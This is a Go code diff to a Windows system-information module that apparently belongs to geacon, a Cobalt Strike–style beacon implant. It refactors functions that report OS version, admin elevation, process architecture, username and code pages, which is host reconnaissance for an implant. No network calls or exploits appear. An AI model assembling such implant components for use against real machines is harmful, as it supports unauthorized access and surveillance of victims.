@@ -2,8 +2,9 @@ package sysinfo
 
 import (
 	"encoding/binary"
-	"fmt"
 	"golang.org/x/sys/windows"
+	"main/util"
+	"runtime"
 	"strings"
 	"syscall"
 	"unsafe"
@@ -61,33 +62,25 @@ func init() {
 func GetOSVersion() string {
 	version, err := syscall.GetVersion()
 	if err != nil {
-		fmt.Println("Error: " + err.Error())
+		util.Println("Error: " + err.Error())
 		return ""
 	}
-	return fmt.Sprintf("%d.%d", byte(version), uint8(version>>8))
+	return util.Sprintf("%d.%d", byte(version), uint8(version>>8))
 }
 
 func GetOSVersion41Plus() string {
 	version, err := syscall.GetVersion()
 	if err != nil {
-		fmt.Println("Error: " + err.Error())
+		util.Println("Error: " + err.Error())
 		return ""
 	}
-	return fmt.Sprintf("%d.%d.%d\n", byte(version), uint8(version>>8), version>>16)
+	return util.Sprintf("%d.%d.%d\n", byte(version), uint8(version>>8), version>>16)
 }
 
+// sometimes not right
 func IsHighPriv() bool {
-	token, err := syscall.OpenCurrentProcessToken()
-	defer func(token syscall.Token) {
-		err := token.Close()
-		if err != nil {
-
-		}
-	}(token)
-	if err != nil {
-		fmt.Printf("open current process token failed: %v\n", err)
-		return false
-	}
+	token := windows.GetCurrentProcessToken()
+	defer token.Close()
 	/*
 		ref:
 		C version https://vimalshekar.github.io/codesamples/Checking-If-Admin
@@ -96,7 +89,7 @@ func IsHighPriv() bool {
 	*/
 	var isElevated uint32
 	var outLen uint32
-	err = syscall.GetTokenInformation(token, syscall.TokenElevation, (*byte)(unsafe.Pointer(&isElevated)), uint32(unsafe.Sizeof(isElevated)), &outLen)
+	err := windows.GetTokenInformation(token, windows.TokenElevation, (*byte)(unsafe.Pointer(&isElevated)), uint32(unsafe.Sizeof(isElevated)), &outLen)
 	if err != nil {
 		return false
 	}
@@ -118,9 +111,9 @@ func GetProcessArch(pid uint32) int {
 	arch := ProcessArchUnknown
 	// https://learn.microsoft.com/en-us/windows/win32/api/wow64apiset/nf-wow64apiset-iswow64process
 	switch systemInfo.ProcessorArchitecture {
-	// isWow64 can't work on arm64, but we still give it a try
+	// isWow64 can't work on arm64, so maybe all process on arm64 is 64 bits
 	case ProcessorArchitectureARM64:
-		fallthrough
+		arch = ProcessArch64
 	case ProcessorArchitectureAMD64:
 		// 0x00100000 PROCESS_QUERY_LIMITED_INFORMATION,this privilege should be permitted in the most situation
 		handler, _ := windows.OpenProcess(uint32(0x1000), false, pid)
@@ -149,29 +142,36 @@ func GetProcessSessionId(pid int32) uint32 {
 
 }
 
+// maybe use GO_ARCH to judge self process is a better choice? only consider some common arch now
 func IsProcessX64() bool {
-	switch systemInfo.ProcessorArchitecture {
-	// isWow64 can't work on arm64, but we still give it a try
-	case ProcessorArchitectureARM64:
-		fallthrough
-	case ProcessorArchitectureAMD64:
-		// 0x00100000 PROCESS_QUERY_LIMITED_INFORMATION,this privilege should be permitted in the most situation
-		var isWow64 bool
-		hProcess, err := windows.GetCurrentProcess()
-		defer windows.CloseHandle(hProcess)
-		if err != nil {
-			panic(err)
-		}
-		_ = windows.IsWow64Process(hProcess, &isWow64)
-		if isWow64 {
-			return false
-		} else {
-			return true
-		}
-	default:
-		return false
-
+	//switch systemInfo.ProcessorArchitecture {
+	//// isWow64 can't work on arm64, so just think it as x64
+	//case ProcessorArchitectureARM64:
+	//	return true
+	//case ProcessorArchitectureAMD64:
+	//	// 0x00100000 PROCESS_QUERY_LIMITED_INFORMATION,this privilege should be permitted in the most situation
+	//	var isWow64 bool
+	//	hProcess, err := windows.GetCurrentProcess()
+	//	defer windows.CloseHandle(hProcess)
+	//	if err != nil {
+	//		panic(err)
+	//	}
+	//	_ = windows.IsWow64Process(hProcess, &isWow64)
+	//	if isWow64 {
+	//		return false
+	//	} else {
+	//		return true
+	//	}
+	//default:
+	//	return true
+	//
+	//}
+	if runtime.GOARCH == "amd64" || runtime.GOARCH == "arm64" || runtime.GOARCH == "arm64be" {
+		//util.Println("geacon is x64")
+		return true
 	}
+	//util.Println("geacon is x86")
+	return false
 }
 
 func GetUsername() string {
@@ -179,7 +179,7 @@ func GetUsername() string {
 	usernameLen := uint32(len(username)) - 1
 	err := windows.GetUserNameEx(windows.NameSamCompatible, &username[0], &usernameLen)
 	if err != nil {
-		fmt.Println("Error: " + err.Error())
+		util.Println("Error: " + err.Error())
 		return ""
 	}
 	usernameStr := windows.UTF16ToString(username)
@@ -195,14 +195,13 @@ func GetUsername() string {
 func GetCodePageANSI() []byte {
 	fnGetACP := Kernel32.NewProc("GetACP")
 	if fnGetACP.Find() != nil {
-		fmt.Println("GetACP not found")
+		util.Println("GetACP not found")
 		return nil
 	}
 	acp, _, _ := fnGetACP.Call()
-	fmt.Printf("ANSI CodePage %v\n", acp)
+	//util.Printf("ANSI CodePage %v\n", acp)
 	ANSICodePage = uint32(acp)
 	acpbytes := make([]byte, 2)
-	//binary.LittleEndian.PutUint32(acpbytes, uint32(acp))
 	binary.LittleEndian.PutUint16(acpbytes, 65001)
 	return acpbytes
 
@@ -211,14 +210,13 @@ func GetCodePageANSI() []byte {
 func GetCodePageOEM() []byte {
 	fnGetOEMCP := Kernel32.NewProc("GetOEMCP")
 	if fnGetOEMCP.Find() != nil {
-		fmt.Println("GetOEMCP not found")
+		util.Println("GetOEMCP not found")
 		return nil
 	}
 	// ignore OEM codepage(maybe will cause problem?)
-	_, _, _ = fnGetOEMCP.Call()
-	//fmt.Printf("OEM CodePage %v\n", acp)
-	acpbytes := make([]byte, 4)
-	//binary.LittleEndian.PutUint32(acpbytes, uint32(acp))
-	binary.LittleEndian.PutUint32(acpbytes, 65001)
-	return acpbytes[:2]
+	//_, _, _ = fnGetOEMCP.Call()
+	//util.Printf("OEM CodePage %v\n", acp)
+	oembytes := make([]byte, 2)
+	binary.LittleEndian.PutUint16(oembytes, 65001)
+	return oembytes[:2]
 }
